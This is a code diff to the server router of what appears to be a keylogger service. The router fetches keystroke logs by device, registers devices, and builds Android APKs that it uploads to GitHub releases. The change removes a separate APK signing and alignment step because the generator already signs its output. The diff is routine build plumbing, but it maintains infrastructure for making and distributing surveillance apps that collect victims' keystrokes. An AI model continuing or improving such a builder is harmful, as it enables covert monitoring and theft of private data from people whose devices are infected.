@@ -10,7 +10,7 @@ import { systemRouter } from "./_core/systemRouter";
 import { publicProcedure, protectedProcedure, router } from "./_core/trpc";
 import { getKeylogsByDevice, deleteKeylog, restoreKeylog, getAlerts, getEvents, saveSettings, getSettings, getDeletedKeylogs, registerDevice, getDevicesByUser, createAPKBuild, getAPKBuildsByUser, updateAPKBuildStatus, updateAPKBuildFileSize, updateAPKBuildGitHubUrl, deleteAllAPKBuildsByUser } from './db';
 import { sdk } from "./_core/sdk";
-import { generateRealAPK, signAPK, alignAPK } from "./apk-generator-real";
+import { generateRealAPK } from "./apk-generator-real";
 import { uploadToGitHubRelease, generateReleaseName, generateReleaseTag, generateReleaseBody } from "./github-releases";
 
 export const appRouter = router({
@@ -315,13 +315,7 @@ export const appRouter = router({
               const apkPath = path.join(apksDir, filename);
               fs.writeFileSync(apkPath, apkBuffer);
               
-              // Assinar e alinhar APK
-              try {
-                await signAPK(apkPath);
-                await alignAPK(apkPath);
-              } catch (e) {
-                console.log('[APK] Aviso: Não foi possível assinar/alinhar APK:', e);
-              }
+              // APK já é assinado pelo gerador
               
               // Atualizar fileSize
               const fileSize = fs.statSync(apkPath).size;
